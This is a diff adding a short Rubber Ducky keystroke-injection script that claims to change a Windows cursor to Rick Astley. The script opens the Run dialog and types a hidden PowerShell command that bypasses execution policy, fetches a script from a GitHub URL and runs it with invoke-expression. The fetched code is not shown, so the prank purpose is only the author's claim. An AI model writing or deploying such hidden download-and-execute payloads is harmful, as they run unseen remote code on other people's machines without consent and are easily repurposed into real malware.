@@ -1,0 +1,15 @@
+REM     Title: RickCurs
+
+REM     Author: CE-Red
+
+REM     Description: A RubberDucky script that turns your cursor to Rick Astley
+
+REM     Target: Windows 10, 11
+
+REM     Method: InvokeWebRequest
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $d = iwr https://raw.githubusercontent.com/CE-Red/RD-RickCurs/main/RickCurs.ps1?dl=1; invoke-expression $d
+ENTER
